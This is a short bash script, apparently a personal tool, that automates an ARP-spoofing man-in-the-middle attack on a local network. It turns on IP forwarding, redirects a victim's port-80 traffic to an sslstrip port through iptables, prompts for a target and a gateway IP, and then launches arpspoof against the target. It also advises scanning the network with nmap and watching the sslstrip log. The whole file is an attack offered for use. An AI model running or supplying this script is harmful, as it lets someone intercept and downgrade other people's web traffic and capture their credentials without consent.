#!/bin/bash/

scriptName=arpspoof.sh
echo "Created on 29/07/2017 by Marc Pascual i Solé. Mail me at mpasole@protonmail.com"
sleep 1.3
echo "Last Modification:" $(stat $scriptName | grep Modify | gawk '{ FS = " " } {print $2}')
sleep 1
echo
echo "to gain more information about your current network, run"
echo "           ~$ nmap -vv <ip_range>"
echo
sleep 1
echo "to know the gateway of your current network run"
echo "           ~$ route"
echo
sleep 1
echo "The targets and routers IP will be asked"
echo
sleep 0.5
################ PROGRAM #################################



# This will allow ip forwarding acting like a VPN:
echo "Changing firewall rules..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo -n "Ip forwarding is now set to "
cat /proc/sys/net/ipv4/ip_forward
sleep 0.5

echo "Redirecting port 80"
#This will redirect the HTTP/S traffic to the SSL strip port 
iptables -t nat -I  PREROUTING 1 -p tcp --destination-port 80 -j REDIRECT --to-port 8080

#Enable the port 8080 to accept tcp traffic
echo "Changing port 8080 permissions"
iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT

echo "done..."
sleep 2

#USER INPUT:
echo -n "Target IP: "
read dTarget
sleep 0.2
echo -n "Gateway IP: "
read dRouter
sleep 0.2
echo
sleep 1
echo "beggining the arpspoof attack..."
sleep 1
echo

sleep 0.5
echo "open another terminal and tail -f the sslstrip log"
sleep 1
#ATTACK:
# open a new terminal with sudo -i gnome-terminal and type tail -f <logFile>
 
xterm -e "arpspoof -i wlp2s0  $dRouter -t $dTarget"  &
